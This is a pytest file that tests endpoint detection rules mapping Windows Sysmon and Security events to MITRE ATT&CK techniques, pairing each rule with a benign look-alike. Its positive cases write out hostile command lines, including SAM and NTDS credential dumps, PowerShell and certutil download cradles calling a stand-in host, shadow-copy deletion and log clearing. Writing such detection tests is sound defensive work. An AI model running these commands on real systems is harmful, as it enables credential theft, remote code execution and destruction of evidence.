"""
Endpoint ATT&CK rules (backend/app/modules/correlation/mitre_endpoint.py, table endpoint-attack-v1).

Every rule has at least one positive case (the technique's canonical form) and one benign look-alike that must NOT fire, because a rule that fires on everything
proves nothing. The cases use public technique definitions and invented hosts and paths, not captured data. Typed-field rules are driven through the real
normaliser with Sysmon and Windows Security records, so the whitelisted ``source_fields`` path is exercised end to end.
"""

from __future__ import annotations

import pytest

from app.modules.correlation.mitre_endpoint import ENDPOINT_MAPPING_VERSION, ENDPOINT_RULES, map_endpoint_techniques
from app.modules.correlation.normalize import normalize_records


def _sysmon(event_id: str, i: int, **fields):
    return {"SourceName": "Microsoft-Windows-Sysmon", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "ws1", "EventID": str(event_id),
            "UtcTime": f"2026-01-02 03:04:{i % 60:02d}.000", "ProcessGuid": "{00000000-0000-0000-0000-00000000%04d}" % i, **fields}


def _proc(i: int, image: str, cmd: str, parent: str = "C:\\Windows\\explorer.exe"):
    return _sysmon("1", i, Image=image, CommandLine=cmd, ParentImage=parent, ProcessId=str(100 + i), User="LAB\\u")


def _techniques(records):
    norm = normalize_records(records)
    assert not norm.rejected, norm.rejected
    return {m.technique_id for m in map_endpoint_techniques(norm.events)}


SYS = "C:\\Windows\\System32\\"
COMMAND_CASES = [
    # (image, command line that must fire, technique, benign look-alike that must not fire the same technique)
    (SYS + "reg.exe", "reg save HKLM\\sam C:\\t\\sam.save", "T1003.002", "reg export HKLM\\SYSTEM\\CurrentControlSet\\Services\\Foo C:\\t\\foo.reg"),
    (SYS + "ntdsutil.exe", "ntdsutil \"ac i ntds\" ifm \"create full c:\\t\"", "T1003.003", "ntdsutil \"metadata cleanup\" quit"),
    (SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')", "T1059.001",
     "powershell -File C:\\scripts\\inventory.ps1"),
    (SYS + "mshta.exe", "mshta vbscript:Execute(\"x\")", "T1218.005", "mshta"),
    (SYS + "regsvr32.exe", "regsvr32 /s /n /u /i:http://x.test/a.sct scrobj.dll", "T1218.010", "regsvr32 /s C:\\app\\component.dll"),
    (SYS + "rundll32.exe", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \"", "T1218.011", "rundll32 user32.dll,LockWorkStation"),
    (SYS + "control.exe", "control C:\\ProgramData\\evil.cpl", "T1218.002", "control sysdm.cpl"),
    ("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe", "InstallUtil.exe /logfile= /LogToConsole=false /u C:\\p\\a.dll", "T1218.004", "InstallUtil.exe"),
    ("C:\\Windows\\hh.exe", "hh.exe C:\\ProgramData\\a.chm", "T1218.001", "hh.exe"),
    (SYS + "msiexec.exe", "msiexec /q /i http://x.test/a.msi", "T1218.007", "msiexec /i C:\\setup\\app.msi"),
    (SYS + "cmstp.exe", "cmstp.exe /s /ni C:\\a.inf", "T1218.003", "cmstp.exe"),
    (SYS + "wbem\\wmic.exe", "wmic /node:HOST2 process call create calc.exe", "T1047", "wmic os get caption"),
    (SYS + "wbem\\wmic.exe", "wmic process list /FORMAT:\"https://x.test/a.xsl\"", "T1220", "wmic process list brief"),
    (SYS + "schtasks.exe", "schtasks /create /tn Updater /tr C:\\a.exe /sc daily", "T1053.005", "schtasks /query"),
    (SYS + "sc.exe", "sc config Fax binPath= \"C:\\a.exe\"", "T1543.003", "sc query Fax"),
    (SYS + "reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v U /d C:\\a.exe", "T1547.001", "reg add HKCU\\Software\\Vendor /v A /d 1"),
    (SYS + "reg.exe", "REG ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\a.bat", "T1037.001", "reg add HKCU\\Environment /v TEMP /d C:\\t"),
    (SYS + "reg.exe", "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\a.exe", "T1548.002", "reg add HKCU\\Software\\Classes\\.txt /d txtfile"),
    (SYS + "auditpol.exe", "auditpol /set /category:\"Logon/Logoff\" /success:disable", "T1562.002", "auditpol /get /category:*"),
    (SYS + "wevtutil.exe", "wevtutil cl Security", "T1070.001", "wevtutil qe System /c:5"),
    (SYS + "vssadmin.exe", "vssadmin delete shadows /all /quiet", "T1490", "vssadmin list shadows"),
    (SYS + "net.exe", "net use \\\\10.0.0.5\\C$ /user:a b", "T1021.002", "net use Z: \\\\fileserver\\public"),
    (SYS + "reg.exe", "reg query \"HKLM\\Software\\Microsoft\\Internet Explorer\" /v svcVersion", "T1518", "reg add HKCU\\Software\\X /v a /d 1"),
    (SYS + "net.exe", "net localgroup administrators", "T1069.001", "net localgroup administrators bob /add"),
    (SYS + "net.exe", "net group \"Domain Admins\" /domain", "T1069.002", "net group Finance"),
    (SYS + "net.exe", "net user /domain", "T1087.002", "net user bob /add"),
    (SYS + "net.exe", "net user hacker P@ss1 /add", "T1136.001", "net user /domain"),
    (SYS + "certutil.exe", "certutil -urlcache -split -f http://x.test/a a.exe", "T1105", "certutil -store my"),
    (SYS + "certutil.exe", "certutil -decode a.b64 a.exe", "T1140", "certutil -hashfile a.exe SHA256"),
    (SYS + "bitsadmin.exe", "bitsadmin /transfer j http://x.test/a C:\\a", "T1197", "bitsadmin /list"),
]


@pytest.mark.parametrize("image,cmd,technique,benign", COMMAND_CASES, ids=[c[2] + ":" + c[1][:18] for c in COMMAND_CASES])
def test_command_rule_fires_on_the_canonical_form_and_not_on_the_look_alike(image, cmd, technique, benign):
    assert technique in _techniques([_proc(1, image, cmd)])
    benign_image = image
    assert technique not in _techniques([_proc(2, benign_image, benign)])


def test_a_registry_subkey_export_is_not_a_hive_dump():
    """Found on the dev half of the public captures: exporting a key under SYSTEM was mistaken for saving the SYSTEM hive."""
    assert "T1003.002" not in _techniques([_proc(1, SYS + "reg.exe", "reg export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Winlogon\\Notifications\" n.reg /y")])
    assert "T1003.002" in _techniques([_proc(1, SYS + "reg.exe", "reg save HKLM\\SYSTEM system.save")])


def _access(i, source, target, mask):
    return _sysmon("10", i, SourceImage=source, TargetImage=target, GrantedAccess=mask, SourceProcessId="9", TargetProcessId="8")


LSASS = "C:\\Windows\\system32\\lsass.exe"


def test_lsass_read_fires_for_a_user_path_process_with_the_read_right():
    assert "T1003.001" in _techniques([_access(1, "C:\\Users\\u\\Desktop\\tool.exe", LSASS, "0x1fffff")])
    assert "T1003.001" in _techniques([_access(1, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", LSASS, "0x1010")])


def test_lsass_read_ignores_os_components_the_read_right_missing_and_other_targets():
    assert "T1003.001" not in _techniques([_access(1, "C:\\Windows\\System32\\wininit.exe", LSASS, "0x1fffff")])
    assert "T1003.001" not in _techniques([_access(1, "C:\\Windows\\System32\\svchost.exe", LSASS, "0x1410")])
    assert "T1003.001" not in _techniques([_access(1, "C:\\Users\\u\\tool.exe", LSASS, "0x1400")])          # query right only
    assert "T1003.001" not in _techniques([_access(1, "C:\\Users\\u\\tool.exe", "C:\\Windows\\notepad.exe", "0x1fffff")])


def test_a_masquerading_name_outside_an_os_directory_is_not_allow_listed():
    assert "T1003.001" in _techniques([_access(1, "C:\\Users\\u\\csrss.exe", LSASS, "0x1fffff")])


def test_remote_thread_ignores_csrss_and_flags_others():
    assert "T1055" in _techniques([_sysmon("8", 1, SourceImage="C:\\Users\\u\\a.exe", TargetImage="C:\\Windows\\notepad.exe")])
    assert "T1055" not in _techniques([_sysmon("8", 1, SourceImage="C:\\Windows\\System32\\csrss.exe", TargetImage="C:\\Windows\\notepad.exe")])


def test_run_key_value_by_a_script_host_fires_and_by_defender_does_not():
    key = "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
    assert "T1547.001" in _techniques([_sysmon("13", 1, Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", TargetObject=key, EventType="SetValue", Details="x")])
    assert "T1547.001" not in _techniques([_sysmon("13", 1, Image="C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe", TargetObject=key, EventType="SetValue", Details="x")])
    assert "T1547.001" not in _techniques([_sysmon("13", 1, Image="C:\\x\\a.exe", TargetObject="HKU\\S-1\\Software\\Vendor\\Run2", EventType="SetValue", Details="x")])


def test_startup_folder_script_fires_and_a_shortcut_does_not():
    base = "C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    assert "T1547.001" in _techniques([_sysmon("11", 1, Image="C:\\x\\a.exe", TargetFilename=base + "a.hta")])
    assert "T1547.001" not in _techniques([_sysmon("11", 1, Image="C:\\x\\a.exe", TargetFilename=base + "a.lnk")])


def test_uac_hijack_registry_value_fires():
    key = "HKU\\S-1\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\(Default)"
    assert "T1548.002" in _techniques([_sysmon("13", 1, Image="C:\\x\\a.exe", TargetObject=key, EventType="SetValue", Details="x")])


def test_wmi_provider_spawn_and_winrm_host_process():
    assert "T1047" in _techniques([_proc(1, SYS + "cmd.exe", "cmd /c whoami", parent="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")])
    assert "T1047" not in _techniques([_proc(1, SYS + "cmd.exe", "cmd /c whoami", parent="C:\\Windows\\explorer.exe")])
    assert "T1021.006" in _techniques([_proc(1, SYS + "wsmprovhost.exe", "C:\\Windows\\system32\\wsmprovhost.exe -Embedding")])


def _security(event_id: str, i: int, **fields):
    return {"SourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Hostname": "ws1", "EventID": event_id,
            "TimeCreated": f"2026-01-02T03:04:{i % 60:02d}.000Z", **fields}


def test_security_events_4719_and_1102():
    assert "T1562.002" in _techniques([_security("4719", 1, SubjectUserName="admin", AuditPolicyChanges="%%8448")])
    assert "T1070.001" in _techniques([_security("1102", 2, SubjectUserName="admin")])
    assert _techniques([_security("4624", 3, TargetUserName="u", LogonType="2")]) == set()


def test_process_creation_through_windows_security_4688_is_read_too():
    rec = _security("4688", 1, NewProcessName=SYS + "schtasks.exe", CommandLine="schtasks /create /tn x /tr C:\\a.exe", SubjectUserName="u", NewProcessId="0x10")
    assert "T1053.005" in _techniques([rec])


def test_source_fields_are_bounded_whitelisted_and_never_an_entity():
    long_value = "A" * 900
    norm = normalize_records([_sysmon("10", 1, SourceImage="C:\\x\\a.exe", TargetImage=long_value, GrantedAccess="0x10", Secret="do-not-copy", Hashes="SHA256=" + "a" * 64)])
    event = norm.events[0]
    fields = dict(event.source_fields)
    assert len(fields["TargetImage"]) == 300 and "Secret" not in fields and "Hashes" not in fields
    assert all(value not in {v for _, v in event.entities} for value in fields.values())


def test_table_integrity():
    ids = [r.rule_id for r in ENDPOINT_RULES]
    assert len(ids) == len(set(ids))
    assert ENDPOINT_MAPPING_VERSION == "endpoint-attack-v1"
    assert all(r.limitation and r.tactics and r.technique_name for r in ENDPOINT_RULES)
    assert all(r.rule_id.startswith("EP-") for r in ENDPOINT_RULES)


def test_duplicate_records_are_one_piece_of_evidence():
    rec = _proc(1, SYS + "schtasks.exe", "schtasks /create /tn x /tr C:\\a.exe")
    norm = normalize_records([rec, dict(rec), dict(rec)])
    mapped = [m for m in map_endpoint_techniques(norm.events) if m.technique_id == "T1053.005"]
    assert len(mapped) == 1 and mapped[0].independent_evidence_count == 1
